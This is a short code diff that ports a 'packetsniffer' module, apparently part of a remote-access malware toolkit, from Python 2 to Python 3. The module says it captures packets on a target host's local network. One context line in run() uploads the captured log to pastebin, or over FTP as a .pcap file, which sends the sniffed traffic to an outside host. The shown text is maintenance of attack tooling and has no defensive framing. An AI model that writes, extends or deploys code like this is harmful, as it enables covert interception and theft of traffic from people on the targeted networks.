@@ -11,7 +11,7 @@ import struct
 import socket
 import urllib
 import binascii
-import StringIO
+from io import StringIO
 
 # utilities
 import core.util as util
@@ -20,7 +20,7 @@ import core.util as util
 packages = []
 platforms = ['linux2','darwin']
 results = {}
-log = StringIO.StringIO()
+log = StringIO()
 usage  = 'packetsniffer [seconds]'
 desription = """ 
 Capture packets on the target client host machine's local network
@@ -173,4 +173,4 @@ def run(mode, seconds=30):
         except: pass
         results[time.ctime()] = util.pastebin(globals()['log']) if 'ftp' not in mode else util.ftp(globals()['log'], filetype='.pcap')
     except Exception as e:
-        util.log("{} error: {}".format(packetsniffer.func_name, str(e)))
+        util.log("{} error: {}".format(packetsniffer.__name__, str(e)))
